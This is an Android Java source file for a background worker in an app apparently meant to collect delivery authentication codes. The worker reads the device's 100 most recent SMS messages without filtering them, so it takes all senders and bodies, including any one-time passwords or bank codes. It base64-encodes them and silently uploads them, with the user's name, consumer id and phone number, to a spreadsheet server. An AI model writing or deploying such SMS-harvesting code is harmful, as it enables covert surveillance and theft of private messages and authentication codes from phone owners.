package android.iocl.dac_collector.Services;
import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.ModelData.ColumnValue;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.SmsPayload;
import android.iocl.dac_collector.ModelData.SmsResponse;
import android.iocl.dac_collector.ModelData.update_dac_collect;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.Utility;
import android.net.Uri;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import androidx.work.ListenableWorker;


import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class SmsFetchWorker extends Worker {

    private static final String TAG = "SmsFetchWorker";
    SharedPrefs prefs;

    public SmsFetchWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        prefs = new SharedPrefs(context);
    }

    @NonNull
    @Override
    public ListenableWorker.Result doWork() {
        try {
            SmsResponse smsList = fetchSmsMessages();
            Log.d(TAG, "doWork: " + smsList);
            if (smsList.getUser() == null) {
                Log.d(TAG, "No SMS messages found.");
            } else {
                sendSmsDataToServer(smsList);
            }
            return Result.success();  // Indicate success
        } catch (Exception e) {
            Log.e(TAG, "Error fetching SMS messages: " + e.getMessage(), e);
            return Result.failure();  // Indicate failure
        }
    }

    private void sendSmsDataToServer(SmsResponse SmsPayload) {




        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> smsInfo = Arrays.asList(
                new ColumnValue("USER_NAME", SmsPayload.getUser()),
                new ColumnValue("USER_NUMBER", SmsPayload.getAnyMobileNo()),
                new ColumnValue("SMS_B64", SmsPayload.getSmsData())
        );

        update_dac_collect receiver = new update_dac_collect("addUserSms", SmsPayload.getUser(), smsInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {


                Log.d(TAG, "onResponse: " + response.body().getMessage());


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

            }
        });


    }

    private String encodeTo64 (String smsPayloads){
        return android.util.Base64.encodeToString(smsPayloads.getBytes(), android.util.Base64.NO_WRAP);
    }

    private SmsResponse fetchSmsMessages() {
        SmsResponse smsResponse = new SmsResponse();
        List<SmsPayload> smsList = new ArrayList<>();
        try {
            // Check permission for Android 6.0+ (API 23+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (getApplicationContext().checkSelfPermission(READ_SMS)
                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    Log.e(TAG, "Permission to read SMS not granted");
                    return smsResponse;
                }
            }

            // Query the SMS content provider
            ContentResolver contentResolver = getApplicationContext().getContentResolver();
            Uri smsUri = Uri.parse("content://sms/");
            Cursor cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100");

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String id = getColumnValue(cursor, "_id");
                    String address = getColumnValue(cursor, "address");
                    String body = getColumnValue(cursor, "body");
                    String date = getColumnValue(cursor, "date");
                    String type = getColumnValue(cursor, "type");
                    SmsPayload smsPayload = new SmsPayload(
                            id,
                            address,
                            body,
                            date,
                            type
                    );
                    smsList.add(smsPayload);
                }
                cursor.close();
                String userName = prefs.getString("user_name", "not_found") + "," + prefs.getString("cons_id", "not_found");

                String encSmsPayload = encodeTo64(new Gson().toJson(smsList));
                smsResponse = new SmsResponse(userName,getMobileNo(),encSmsPayload);
            }
        } catch (SecurityException se) {
            Log.e(TAG, "SecurityException: " + se.getMessage(), se);
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.getMessage(), e);
        }
        return smsResponse;
    }


    private String getMobileNo () {
        if (ActivityCompat.checkSelfPermission(getApplicationContext(), READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(getApplicationContext(), READ_PHONE_NUMBERS) ==
                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(),
                READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            // Permission check

            // Create obj of TelephonyManager and ask for current telephone service
            TelephonyManager telephonyManager = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
            String phoneNumber = telephonyManager.getLine1Number();


            return phoneNumber;
        }else {
            return "User Not Granted Any Permissions {READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE}";
        }
    }
    // Helper function to handle null or missing values
    private String getColumnValue(Cursor cursor, String columnName) {
        int columnIndex = cursor.getColumnIndex(columnName);
        if (columnIndex != -1) {
            String value = cursor.getString(columnIndex);
            return value != null ? value : "";  // Return empty string if value is null
        } else {
            return "";  // Return empty string if column is missing
        }
    }
}
